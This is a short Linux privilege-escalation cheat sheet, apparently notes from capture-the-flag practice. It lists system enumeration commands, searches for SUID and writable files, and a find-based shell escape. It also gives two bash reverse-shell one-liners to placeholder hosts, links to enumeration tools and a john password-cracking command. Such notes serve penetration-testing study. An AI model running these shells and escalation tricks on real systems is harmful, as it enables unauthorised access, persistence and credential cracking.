
# Privilege Escalation

## Goals

Reset passwords.

Bypass access controls to compromise/collect protected data.

Edit software configs.

Persistence (backdoors).

Change privilege of existing (or new) users to remain undetected.

Execute admin commands.


## Enumerate

```bash
hostname 
uname -a 
cat /proc/version 
cat /etc/issue
ps axjf
ps aux
env
sudo -l
id <name>
cat /etc/passwd | cut -d ":" -f 1
history
ifconfig
netstat
ss
find . -name flag1.txt #find the file named “flag1.txt” in the current directory
find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
find / -type d -name config # find the directory named config under “/”
find / -type f -perm 0777 # find files with the 777 permissions (files readable, writable, and executable by all users)
find / -type f -perm -04000 -ls 2>/dev/null # find bins with suid
find / -perm a=x # find executable files
find /home -user frank # find all files for user “frank” under “/home”
find / -mtime 10 # find files that were modified in the last 10 days
find / -atime 10 # find files that were accessed in the last 10 day
find / -cmin -60 # find files changed within the last hour (60 minutes)
find / -amin -60 # find files accesses within the last hour (60 minutes)
find / -size 50M # find files with a 50 MB size
find / -perm -222 -type d 2>/dev/null #  Find world-writeable folders
find / -perm -o w -type d 2>/dev/null #  Find world-writeable folders
find / -perm -o x -type d 2>/dev/null # Find world-executable folders
find / -name name* # find devl tools and supported langs
find / -perm -u=s -type f 2>/dev/null # find files with suid bit
find / -writable -type d 2>/dev/null  #  Find world-writeable folders
find / -writable -d 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
sudo lsof -i :<port> # find pid of port

The spawn a shell from bash:

bash -c 'sh -i >& /dev/tcp/ipaddress/port 0>&1'

# explore man pages for:
#   find, 
#   locate
#   grep
#   cut
#   sort
#   getcap
[command] 2>/dev/null # redirect errors to stderr

```
Example: exploiting find:
find . -exec /bin/sh \; -quit
find /home/finder -name flag.txt -exec cat {} \; -quit
find . -exec /bin/bash -c 'bash -i >& /dev/tcp/your_ip/your_port 0>&1' \; -quit

## Automated Enumeration tools:
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

## The Kernel exploit methodology:

- Identify the kernel version
- Search and find an exploit code for the kernel version of the target system
- Run the exploit


## john
john --wordlist=<pathtowordlist> <hashfile>



